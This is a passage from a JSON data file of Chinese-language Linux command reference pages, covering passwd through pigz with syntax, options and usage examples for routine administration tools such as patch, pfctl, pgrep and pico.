过期天数</span>\n</code></pre>\n<h3 id=\"实例\">实例</h3>\n<p>如果是普通用户执行passwd只能修改自己的密码。如果新建用户后，要为新用户创建密码，则用passwd用户名，注意要以root用户的权限来创建。</p>\n<pre><code class=\"language-shell\">[root@localhost ~]<span class=\"hljs-comment\"># passwd linuxde     # 更改或创建linuxde用户的密码；</span>\nChanging password for <span class=\"hljs-keyword\">user</span> <span class=\"hljs-title\">linuxde</span>.\nNew UNIX password:           <span class=\"hljs-comment\"># 请输入新密码；</span>\nRetype new UNIX password:    <span class=\"hljs-comment\"># 再输入一次；</span>\npasswd: all authentication tokens updated successfully.  <span class=\"hljs-comment\"># 成功；</span>\n</code></pre>\n<p>普通用户如果想更改自己的密码，直接运行passwd即可，比如当前操作的用户是linuxde。</p>\n<pre><code class=\"language-shell\">[linuxde@localhost ~]$ passwd\nChanging <span class=\"hljs-keyword\">password</span> <span class=\"hljs-keyword\">for</span> <span class=\"hljs-keyword\">user</span> linuxde.  # 更改linuxde用户的密码；\n(<span class=\"hljs-keyword\">current</span>) UNIX <span class=\"hljs-keyword\">password</span>:    # 请输入当前密码；\n<span class=\"hljs-built_in\">New</span> UNIX <span class=\"hljs-keyword\">password</span>:          # 请输入新密码；\nRetype <span class=\"hljs-built_in\">new</span> UNIX <span class=\"hljs-keyword\">password</span>:   # 确认新密码；\npasswd: <span class=\"hljs-keyword\">all</span> authentication tokens updated successfully.  # 更改成功；\n</code></pre>\n<p>比如我们让某个用户不能修改密码，可以用<code>-l</code>选项来锁定：</p>\n<pre><code class=\"language-shell\">[root@localhost ~]<span class=\"hljs-comment\"># passwd -l linuxde     # 锁定用户linuxde不能更改密码；</span>\nLocking password for <span class=\"hljs-keyword\">user</span> <span class=\"hljs-title\">linuxde</span>.\npasswd: Success            <span class=\"hljs-comment\"># 锁定成功；</span>\n\n[linuxde@localhost ~]<span class=\"hljs-comment\"># su linuxde    # 通过su切换到linuxde用户；</span>\n[linuxde@localhost ~]$ passwd       <span class=\"hljs-comment\"># linuxde来更改密码；</span>\nChanging password for <span class=\"hljs-keyword\">user</span> <span class=\"hljs-title\">linuxde</span>.\nChanging password for linuxde\n(current) UNIX password:           <span class=\"hljs-comment\"># 输入linuxde的当前密码；</span>\npasswd: Authentication token manipulation error      <span class=\"hljs-comment\"># 失败，不能更改密码；</span>\n</code></pre>\n<p>再来一例：</p>\n<pre><code class=\"language-shell\">[root@localhost ~]<span class=\"hljs-comment\"># passwd -d linuxde   # 清除linuxde用户密码；</span>\nRemoving password for <span class=\"hljs-keyword\">user</span> <span class=\"hljs-title\">linuxde</span>.\npasswd: Success                          <span class=\"hljs-comment\"># 清除成功；</span>\n\n[root@localhost ~]<span class=\"hljs-comment\"># passwd -S linuxde     # 查询linuxde用户密码状态；</span>\nEmpty password.                          <span class=\"hljs-comment\"># 空密码，也就是没有密码；</span>\n</code></pre>\n<p>注意：当我们清除一个用户的密码时，登录时就无需密码，这一点要加以注意。</p>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "paste",
        "des": "将多个文件按列队列合并",
        "body": "<h1 id=\"paste\">paste</h1>\n<p>将多个文件按列队列合并</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>paste命令</strong> 用于将多个文件按照列队列进行合并。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">paste</span><span class=\"hljs-params\">(选项)</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\">-d<span class=\"hljs-attribute\">&lt;间隔字符&gt;</span>或--delimiters=<span class=\"hljs-attribute\">&lt;间隔字符&gt;</span>：用指定的间隔字符取代跳格字符；\n-s或——serial串列进行而非平行处理。\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<p>文件列表：指定需要合并的文件列表。</p>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "patch",
        "des": "为开放源代码软件安装补丁程序",
        "body": "<h1 id=\"patch\">patch</h1>\n<p>为开放源代码软件安装补丁程序</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>patch命令</strong> 被用于为开放源代码软件安装补丁程序。让用户利用设置修补文件的方式，修改，更新原始文件。如果一次仅修改一个文件，可直接在命令列中下达指令依序执行。如果配合修补文件的方式则能一次修补大批文件，这也是Linux系统核心的升级方法之一。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">patch</span><span class=\"hljs-params\">(选项)</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\">-b或<span class=\"hljs-params\">--backup</span>：备份每一个原始文件；\n-B&lt;备份字首字符串&gt;或<span class=\"hljs-params\">--prefix=</span>&lt;备份字首字符串&gt;：设置文件备份时，附加在文件名称前面的字首字符串，该字符串可以是路径名称；\n-c或<span class=\"hljs-params\">--context</span>：把修补数据解译成关联性的差异；\n-d&lt;工作目录&gt;或<span class=\"hljs-params\">--directory=</span>&lt;工作目录&gt;：设置工作目录；\n-D&lt;标示符号&gt;或<span class=\"hljs-params\">--ifdef=</span>&lt;标示符号&gt;：用指定的符号把改变的地方标示出来；\n-e或<span class=\"hljs-params\">--ed</span>：把修补数据解译成ed指令可用的叙述文件；\n-E或<span class=\"hljs-params\">--remove-empty-files</span>：若修补过后输出的文件其内容是一片空白，则移除该文件；\n-f或<span class=\"hljs-params\">--force</span>：此参数的效果和指定<span class=\"hljs-string\">\"-t\"</span>参数类似，但会假设修补数据的版本为新版本；\n-F&lt;监别列数&gt;或<span class=\"hljs-params\">--fuzz</span>&lt;监别列数&gt;：设置监别列数的最大值；\n-g&lt;控制数值&gt;或<span class=\"hljs-params\">--get=</span>&lt;控制数值&gt;：设置以RSC或SCCS控制修补作业；\n-i&lt;修补文件&gt;或<span class=\"hljs-params\">--input=</span>&lt;修补文件&gt;：读取指定的修补问家你；\n-l或<span class=\"hljs-params\">--ignore-whitespace</span>：忽略修补数据与输入数据的跳格，空格字符；\n-n或<span class=\"hljs-params\">--normal</span>：把修补数据解译成一般性的差异；\n-N或<span class=\"hljs-params\">--forward</span>：忽略修补的数据较原始文件的版本更旧，或该版本的修补数据已使 用过；\n-o&lt;输出文件&gt;或<span class=\"hljs-params\">--output=</span>&lt;输出文件&gt;：设置输出文件的名称，修补过的文件会以该名称存放；\n-p&lt;剥离层级&gt;或<span class=\"hljs-params\">--strip=</span>&lt;剥离层级&gt;：设置欲剥离几层路径名称；\n-f&lt;拒绝文件&gt;或<span class=\"hljs-params\">--reject-file=</span>&lt;拒绝文件&gt;：设置保存拒绝修补相关信息的文件名称，预设的文件名称为<span class=\"hljs-string\">.rej</span>；\n-R或<span class=\"hljs-params\">--reverse</span>：假设修补数据是由新旧文件交换位置而产生；\n-s或<span class=\"hljs-params\">--quiet</span>或<span class=\"hljs-params\">--silent</span>：不显示指令执行过程，除非发生错误；\n-t或<span class=\"hljs-params\">--batch</span>：自动略过错误，不询问任何问题；\n-T或<span class=\"hljs-params\">--set-time</span>：此参数的效果和指定<span class=\"hljs-string\">\"-Z\"</span>参数类似，但以本地时间为主；\n-u或<span class=\"hljs-params\">--unified</span>：把修补数据解译成一致化的差异；\n-v或<span class=\"hljs-params\">--version</span>：显示版本信息；\n-V&lt;备份方式&gt;或<span class=\"hljs-params\">--version-control=</span>&lt;备份方式&gt;：用<span class=\"hljs-string\">\"-b\"</span>参数备份目标文件后，备份文件的字尾会被加上一个备份字符串，这个字符串不仅可用<span class=\"hljs-string\">\"-z\"</span>参数变更，当使用<span class=\"hljs-string\">\"-V\"</span>参数指定不同备份方式时，也会产生不同字尾的备份字符串；\n-Y&lt;备份字首字符串&gt;或<span class=\"hljs-params\">--basename-prefix=--</span>&lt;备份字首字符串&gt;：设置文件备份时，附加在文件基本名称开头的字首字符串；\n-z&lt;备份字尾字符串&gt;或<span class=\"hljs-params\">--suffix=</span>&lt;备份字尾字符串&gt;：此参数的效果和指定<span class=\"hljs-string\">\"-B\"</span>参数类似，差别在于修补作业使用的路径与文件名若为src/linux/fs/super.c，加上<span class=\"hljs-string\">\"backup/\"</span>字符串后，文件super.c会备份于<span class=\"hljs-string\">/src/linux/fs/backup</span>目录里；\n-Z或<span class=\"hljs-params\">--set-utc</span>：把修补过的文件更改，存取时间设为UTC；\n<span class=\"hljs-params\">--backup-if-mismatch</span>：在修补数据不完全吻合，且没有刻意指定要备份文件时，才备份文件；\n<span class=\"hljs-params\">--binary</span>：以二进制模式读写数据，而不通过标准输出设备；\n<span class=\"hljs-params\">--help</span>：在线帮助；\n<span class=\"hljs-params\">--nobackup-if-mismatch</span>：在修补数据不完全吻合，且没有刻意指定要备份文件时，不要备份文件；\n<span class=\"hljs-params\">--verbose</span>：详细显示指令的执行过程。\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<ul>\n<li>原文件：指定需要打补丁的原始文件；</li>\n<li>补丁文件：指定补丁文件。</li>\n</ul>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "pathchk",
        "des": "检查文件中不可移植的部分",
        "body": "<h1 id=\"pathchk\">pathchk</h1>\n<p>检查文件中不可移植的部分</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>pathchk命令</strong> 用来检查文件中不可移植的部分。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">pathchk</span><span class=\"hljs-params\">(选项)</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-p：检查大多数的POSIX系统；</span>\n<span class=\"hljs-deletion\">-P：检查空名字和“-”开头的文件；</span>\n<span class=\"hljs-deletion\">--portability：检查所有的POSIX系统，等同于“-P-p”选项；</span>\n<span class=\"hljs-deletion\">--help：显示帮助；</span>\n<span class=\"hljs-deletion\">--wersion：显示版本号。</span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<ul>\n<li>  文件：带路径信息的文件；</li>\n<li>  后缀：可选参数，指定要去除的文件后缀字符串。</li>\n</ul>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "perl",
        "des": "perl语言解释器",
        "body": "<h1 id=\"perl\">perl</h1>\n<p>perl语言解释器</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>perl命令</strong> 是perl语言解释器，负责解释执行perl语言程序。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">perl</span><span class=\"hljs-params\">(选项)</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-w：输出有用的警告信息；</span>\n<span class=\"hljs-deletion\">-U：允许不安全的操作；</span>\n<span class=\"hljs-deletion\">-c：仅检查文件的语法；</span>\n<span class=\"hljs-deletion\">-d：在调试下运行脚本程序。</span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<p>文件：要运行的perl脚本程序。</p>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "pfctl",
        "des": "PF防火墙的配置命令",
        "body": "<h1 id=\"pfctl\">pfctl</h1>\n<p>PF防火墙的配置命令</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>pfctl命令</strong> 是PF防火墙的配置命令，PF防火墙( 全称：Packet Filter )是UNIX LIKE系统上进行TCP/ip流量过滤和网络地址转换的软件系统。PF同样也能提供TCP/IP流量的整形和控制，并且提供带宽控制和数据包优先集控制。PF最早是由Daniel Hartmeier开发的，现在的开发和维护由Daniel和openBSD小组的其他成员负责。</p>\n<p>PF防火墙的功能很多，本站只列举一些基本配置。</p>\n<h3 id=\"激活\">激活</h3>\n<p>要激活pf并且使它在启动时调用配置文件，编辑<code>/etc/rc.conf</code>文件，修改配置pf的一行：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attr\">pf</span>=<span class=\"hljs-literal\">yes</span>\n</code></pre>\n<p>重启操作系统让配置生效。</p>\n<p>也可以通过pfctl程序启动和停止pf：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">pfctl -e\npfctl -d</span>\n</code></pre>\n<p>注意这仅仅是启动和关闭PF，实际它不会载入规则集，规则集要么在系统启动时载入，要在PF启动后通过命令单独载入。</p>\n<h3 id=\"配置\">配置</h3>\n<p>系统引导到在rc脚本文件运行PF时PF从<code>/etc/pf.conf</code>文件载入配置规则。注意当<code>/etc/pf.conf</code>文件是默认配置文件，在系统调用rc脚本文件时，它仅仅是作为文本文件由pfctl装入并解释和插入pf的。对于一些应用来说，其他的规则集可以在系统引导后由其他文件载入。对于一些设计的非常好的unix程序，PF提供了足够的灵活性。</p>\n<p> <strong>pf.conf文件有7个部分：</strong> </p>\n<ol>\n<li> 宏：用户定义的变量，包括IP地址，接口名称等等。</li>\n<li> 表：一种用来保存IP地址列表的结构。</li>\n<li> 选项：控制PF如何工作的变量。</li>\n<li> 整形：重新处理数据包，进行正常化和碎片整理。</li>\n<li> 排队：提供带宽控制和数据包优先级控制。</li>\n<li> 转换：控制网络地址转换和数据包重定向。</li>\n<li> 过滤规则：在数据包通过接口时允许进行选择性的过滤和阻止。</li>\n</ol>\n<p>除去宏和表，其他的段在配置文件中也应该按照这个顺序出现，尽管对于一些特定的应用并不是所有的段都是必须的。</p>\n<p>空行会被忽略，以#开头的行被认为是注释。</p>\n<h3 id=\"控制\">控制</h3>\n<p>引导之后，PF可以通过pfctl程序进行操作，以下是一些例子：</p>\n<pre><code class=\"language-shell\">pfctl -f <span class=\"hljs-regexp\">/etc/</span>pf.conf  <span class=\"hljs-comment\"># 载入 pf.conf 文件</span>\npfctl -nf <span class=\"hljs-regexp\">/etc/</span>pf.conf <span class=\"hljs-comment\"># 解析文件，但不载入</span>\npfctl -Nf <span class=\"hljs-regexp\">/etc/</span>pf.conf <span class=\"hljs-comment\"># 只载入文件中的NAT规则</span>\npfctl -Rf <span class=\"hljs-regexp\">/etc/</span>pf.conf <span class=\"hljs-comment\"># 只载入文件中的过滤规则</span>\npfctl -sn <span class=\"hljs-comment\"># 显示当前的NAT规则</span>\npfctl -sr <span class=\"hljs-comment\"># 显示当前的过滤规则</span>\npfctl -ss <span class=\"hljs-comment\"># 显示当前的状态表</span>\npfctl -si <span class=\"hljs-comment\"># 显示过滤状态和计数</span>\npfctl -sa <span class=\"hljs-comment\"># 显示任何可显示的</span>\n</code></pre>\n<p>完整的命令列表，请参阅pfctl的man手册页。</p>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "pgrep",
        "des": "根据用户给出的信息在当前运行进程中查找并列出符合条件的进程ID（PID）",
        "body": "<h1 id=\"pgrep\">pgrep</h1>\n<p>根据用户给出的信息在当前运行进程中查找并列出符合条件的进程ID（PID）</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>pgrep命令</strong> 以名称为依据从运行进程队列中查找进程，并显示查找到的进程id。每一个进程ID以一个十进制数表示，通过一个分割字符串和下一个ID分开，默认的分割字符串是一个新行。对于每个属性选项，用户可以在命令行上指定一个以逗号分割的可能值的集合。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">pgrep</span><span class=\"hljs-params\">(选项)</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-o：仅显示找到的最小（起始）进程号；</span>\n<span class=\"hljs-deletion\">-n：仅显示找到的最大（结束）进程号；</span>\n<span class=\"hljs-deletion\">-l：显示进程名称；</span>\n<span class=\"hljs-deletion\">-P：指定父进程号；</span>\n<span class=\"hljs-deletion\">-g：指定进程组；</span>\n<span class=\"hljs-deletion\">-t：指定开启进程的终端；</span>\n<span class=\"hljs-deletion\">-u：指定进程的有效用户ID。</span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<p>进程名称：指定要查找的进程名称，同时也支持类似grep指令中的匹配模式。</p>\n<h3 id=\"实例\">实例</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-string\">pgrep</span> <span class=\"hljs-string\">-lo</span> <span class=\"hljs-string\">httpd</span>\n<span class=\"hljs-number\">4557 </span><span class=\"hljs-string\">httpd</span>\n [<span class=\"hljs-string\">root@localhost</span> <span class=\"hljs-string\">~</span>]<span class=\"hljs-comment\"># pgrep -ln httpd</span>\n<span class=\"hljs-number\">4566 </span><span class=\"hljs-string\">httpd</span>\n\n[<span class=\"hljs-string\">root@localhost</span> <span class=\"hljs-string\">~</span>]<span class=\"hljs-comment\"># pgrep -l httpd</span>\n<span class=\"hljs-number\">4557 </span><span class=\"hljs-string\">httpd</span>\n<span class=\"hljs-number\">4560 </span><span class=\"hljs-string\">httpd</span>\n<span class=\"hljs-number\">4561 </span><span class=\"hljs-string\">httpd</span>\n<span class=\"hljs-number\">4562 </span><span class=\"hljs-string\">httpd</span>\n<span class=\"hljs-number\">4563 </span><span class=\"hljs-string\">httpd</span>\n<span class=\"hljs-number\">4564 </span><span class=\"hljs-string\">httpd</span>\n<span class=\"hljs-number\">4565 </span><span class=\"hljs-string\">httpd</span>\n<span class=\"hljs-number\">4566 </span><span class=\"hljs-string\">httpd</span>\n\n[<span class=\"hljs-string\">root@localhost</span> <span class=\"hljs-string\">~</span>]<span class=\"hljs-comment\"># pgrep httpd 4557</span>\n<span class=\"hljs-number\">4560</span>\n<span class=\"hljs-number\">4561</span>\n<span class=\"hljs-number\">4562</span>\n<span class=\"hljs-number\">4563</span>\n<span class=\"hljs-number\">4564</span>\n<span class=\"hljs-number\">4565</span>\n<span class=\"hljs-number\">4566</span>\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->\n"
    },
    {
        "title": "php",
        "des": "PHP语言的命令行接口",
        "body": "<h1 id=\"php\">php</h1>\n<p>PHP语言的命令行接口</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>php命令</strong> 是流行的Web开发语言PHP的命令行接口，可以使用PHP语言开发基于命令行的系统管理脚本程序。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">php</span><span class=\"hljs-params\">(选项)</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-a：进入交互模式；</span>\n<span class=\"hljs-deletion\">-c：指定“php.ini”的搜索路径。</span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<p>文件：要执行的php脚本。</p>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "pico",
        "des": "功能强大全屏幕的文本编辑器",
        "body": "<h1 id=\"pico\">pico</h1>\n<p>功能强大全屏幕的文本编辑器</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>pico命令</strong> 是功能强大全屏幕的文本编辑器。pico的操作简单，提供了丰富的快捷键。常用的快捷键如下：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-variable\">Ctrl</span><span class=\"hljs-operator\">+</span><span class=\"hljs-variable\">G</span>：获得<span class=\"hljs-variable\">pico</span>的帮助信息；\n<span class=\"hljs-variable\">Ctrl</span><span class=\"hljs-operator\">+</span><span class=\"hljs-built_in\">O</span>：保存文件内容，如果是新文件，需要输入文件名；\n<span class=\"hljs-variable\">Ctrl</span><span class=\"hljs-operator\">+</span><span class=\"hljs-variable\">R</span>：在当前光标位置插入一个指定的文本文件内容；\n<span class=\"hljs-variable\">Ctrl</span><span class=\"hljs-operator\">+</span><span class=\"hljs-variable\">Y</span>：向前翻页；\n<span class=\"hljs-variable\">Ctrl</span><span class=\"hljs-operator\">+</span><span class=\"hljs-variable\">V</span>：向后翻页；\n<span class=\"hljs-variable\">Ctrl</span><span class=\"hljs-operator\">+</span><span class=\"hljs-variable\">w</span>：对文件进行搜索；\n<span class=\"hljs-variable\">Ctrl</span><span class=\"hljs-operator\">+</span><span class=\"hljs-built_in\">K</span>：剪切当前文件行到粘贴缓冲区；\n<span class=\"hljs-variable\">Ctrl</span><span class=\"hljs-operator\">+</span><span class=\"hljs-variable\">U</span>：粘贴缓冲区中的内容到当前光标所在位置；\n<span class=\"hljs-variable\">Ctrl</span><span class=\"hljs-operator\">+</span><span class=\"hljs-built_in\">C</span>：显示当前光标位置；\n<span class=\"hljs-variable\">Ctrl</span><span class=\"hljs-operator\">+</span><span class=\"hljs-variable\">T</span>：调用拼写检查功能，对文档进行拼写检查；\n<span class=\"hljs-variable\">Ctrl</span><span class=\"hljs-operator\">+</span><span class=\"hljs-variable\">J</span>：段落重排；\n<span class=\"hljs-variable\">Ctrl</span><span class=\"hljs-operator\">+</span><span class=\"hljs-variable\">X</span>：退出，当文件内容发生改变时，提供是否保存修改。\n</code></pre>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">pico</span><span class=\"hljs-params\">(选项)</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-b：开启置换的功能；</span>\n<span class=\"hljs-deletion\">-d：开启删除的功能；</span>\n<span class=\"hljs-deletion\">-e：使用完整的文件名称；</span>\n<span class=\"hljs-deletion\">-f：支持键盘上F1、F2...功能键；</span>\n<span class=\"hljs-deletion\">-g：显示光标；</span>\n<span class=\"hljs-deletion\">-h：在线帮助；</span>\n<span class=\"hljs-deletion\">-j：开启切换的功能；</span>\n<span class=\"hljs-deletion\">-k：预设pico在使用剪下命令时，会把光标所在的列的内容全部删除；</span>\n<span class=\"hljs-deletion\">-m：开启鼠标支持的功能，您可用鼠标点选命令列表；</span>\n<span class=\"hljs-deletion\">-n&lt;间隔秒数&gt;：设置多久检查一次新邮件；</span>\n<span class=\"hljs-deletion\">-o&lt;工作目录&gt;：设置工作目录；</span>\n<span class=\"hljs-deletion\">-q：忽略预设值；</span>\n<span class=\"hljs-deletion\">-r&lt;编辑页宽&gt;：设置编辑文件的页宽；</span>\n<span class=\"hljs-deletion\">-s&lt;拼字检查器&gt;：另外指定拼字检查器；</span>\n<span class=\"hljs-deletion\">-t：启动工具模式；</span>\n<span class=\"hljs-deletion\">-v：启动阅读模式，用户只能观看，无法编辑文件的内容；</span>\n<span class=\"hljs-deletion\">-w：关闭自动换行，通过这个参数可以编辑内容很长的列；</span>\n<span class=\"hljs-deletion\">-x：关闭页面下方的命令列表；</span>\n<span class=\"hljs-deletion\">-z：让pico可被Ctrl+z中断，暂存在后台作业里；</span>\n<span class=\"hljs-addition\">+&lt;列表编号&gt;：执行pico指令进入编辑模式时，从指定的列数开始编辑。</span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<p>文件：指定要编辑的文件。</p>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "pidof",
        "des": "查找指定名称的进程的进程号ID号",
        "body": "<h1 id=\"pidof\">pidof</h1>\n<p>查找指定名称的进程的进程号ID号</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>pidof命令</strong> 用于查找指定名称的进程的进程号id号。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">pidof</span><span class=\"hljs-params\">(选项)</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-s：仅返回一个进程号；</span>\n<span class=\"hljs-deletion\">-c：仅显示具有相同“root”目录的进程；</span>\n<span class=\"hljs-deletion\">-x：显示由脚本开启的进程；</span>\n<span class=\"hljs-deletion\">-o：指定不显示的进程ID。</span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<p>进程名称：指定要查找的进程名称。</p>\n<h3 id=\"实例\">实例</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-string\">pidof</span> <span class=\"hljs-string\">nginx</span>\n<span class=\"hljs-number\">13312</span> <span class=\"hljs-number\">5371</span>\n\n<span class=\"hljs-string\">pidof</span> <span class=\"hljs-string\">crond</span>\n<span class=\"hljs-number\">1509</span>\n\n<span class=\"hljs-string\">pidof</span> <span class=\"hljs-string\">init</span>\n<span class=\"hljs-number\">1</span>\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "pigz",
        "des": "可以用来解压缩文件，gzip的并行实现升级版",
        "body": "<h1 id=\"pigz\">pigz</h1>\n<p>可以用来解压缩文件，gzip的并行实现升级版</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>pigz命令</strong>可以用来解压缩文件，最重要的是支持多线程并行处理，解压缩比gzip快。主页: <a href=\"http://zlib.net/pigz/\">http://zlib.net/pigz/</a></p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\">pigz <span class=\"hljs-selector-attr\">[ -cdfhikKlLmMnNqrRtz0..9,11 ]</span> <span class=\"hljs-selector-attr\">[ -b blocksize ]</span> <span class=\"hljs-selector-attr\">[ -p threads ]</span> <span class=\"hljs-selector-attr\">[ -S suffix ]</span> <span class=\"hljs-selector-attr\">[ name ...  ]</span>\nunpigz <span class=\"hljs-selector-attr\">[ -cfhikKlLmMnNqrRtz ]</span> <span class=\"hljs-selector-attr\">[ -b blocksize ]</span> <span class=\"hljs-selector-attr\">[ -p threads ]</span> <span class=\"hljs-selector-attr\">[ -S suffix ]</span> <span class=\"hljs-selector-attr\">[ name ...  ]</span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<pre><code class=\"language-shell\">-0 to -9, -11       <span class=\"hljs-comment\"># Compression level (level 11, zopfli, is much slower)</span>\n<span class=\"hljs-params\">--fast</span>, <span class=\"hljs-params\">--best</span>      <span class=\"hljs-comment\"># Compression levels 1 and 9 respectively</span>\n-b, <span class=\"hljs-params\">--blocksize</span> mmm <span class=\"hljs-comment\"># Set compression block size to mmmK (default 128K)</span>\n-c, <span class=\"hljs-params\">--stdout</span>        <span class=\"hljs-comment\"># Write all processed output to stdout (won't delete)</span>\n-d, <span class=\"hljs-params\">--decompress</span>    <span class=\"hljs-comment\"># Decompress the compressed input</span>\n-f, <span class=\"hljs-params\">--force</span>         <span class=\"hljs-comment\"># Force overwrite, compress .gz, links, and to terminal</span>\n-F  <span class=\"hljs-params\">--first</span>         <span class=\"hljs-comment\"># Do iterations first, before block split for -11</span>\n-h, <span class=\"hljs-params\">--help</span>          <span class=\"hljs-comment\"># Display a help screen and quit</span>\n-i, <span class=\"hljs-params\">--independent</span>   <span class=\"hljs-comment\"># Compress blocks independently for damage recovery</span>\n-I, <span class=\"hljs-params\">--iterations</span> n  <span class=\"hljs-comment\"># Number of iterations for -11 optimization</span>\n-J, <span class=\"hljs-params\">--maxsplits</span> n   <span class=\"hljs-comment\"># Maximum number of split blocks for -11</span>\n-k, <span class=\"hljs-params\">--keep</span>          <span class=\"hljs-comment\"># Do not delete original file after processing</span>\n-K, <span class=\"hljs-params\">--zip</span>           <span class=\"hljs-comment\"># Compress to PKWare zip (.zip) single entry format</span>\n-l, <span class=\"hljs-params\">--list</span>          <span class=\"hljs-comment\"># List the contents of the compressed input</span>\n-L, <span class=\"hljs-params\">--license</span>       <span class=\"hljs-comment\"># Display the pigz license and quit</span>\n-m, <span class=\"hljs-params\">--no-time</span>       <span class=\"hljs-comment\"># Do not store or restore mod time</span>\n-M, <span class=\"hljs-params\">--time</span>          <span class=\"hljs-comment\"># Store or restore mod time</span>\n-n, <span class=\"hljs-params\">--no-name</span>       <span class=\"hljs-comment\"># Do not store or restore file name or mod time</span>\n-N, <span class=\"hljs-params\">--name</span>          <span class=\"hljs-comment\"># Store or restore file name and mod time</span>\n-O  <span class=\"hljs-params\">--oneblock</span>      <span class=\"hljs-comment\"># Do not split into smaller blocks for -11</span>\n-p, <span class=\"hljs-params\">--processes</span> n   <span class=\"hljs-comment\"># Allow up to n compression threads (default is the number of online processors, or 8 if unknown)</span>\n-q, <span class=\"hljs-params\">--quiet</span>         <span class=\"hljs-comment\"># Print no messages, even on error</span>\n-r, <span class=\"hljs-params\">--recursive</span>     <span class=\"hljs-comment\"># Process the contents of all subdirectories</span>\n-R, <span class=\"hljs-params\">--rsyncable</span>     <span class=\"hljs-comment\"># Input-determined block locations for rsync</span>\n-S, <span class=\"hljs-params\">--suffix</span> <span class=\"hljs-string\">.sss</span>   <span class=\"hljs-comment\"># Use suffix .sss instead of .gz (for compression)</span>\n-t, <span class=\"hljs-params\">--test</span>          <span class=\"hljs-comment\"># Test the integrity of the compressed input</span>\n-v, <span class=\"hljs-params\">--verbose</span>       <span class=\"hljs-comment\"># Provide more verbose output</span>\n-V  <span class=\"hljs-params\">--version</span>       <span class=\"hljs-comment\"># Show the version of pigz</span>\n-Y  <span class=\"hljs-params\">--synchronous</span>   <span class=\"hljs-comment\"># Force output file write to permanent storage</span>\n-z, <span class=\"hljs-params\">--zlib</span>          <span class=\"hljs-comment\"># Compress to zlib (.zz) instead of gzip format</span>\n--                  <span 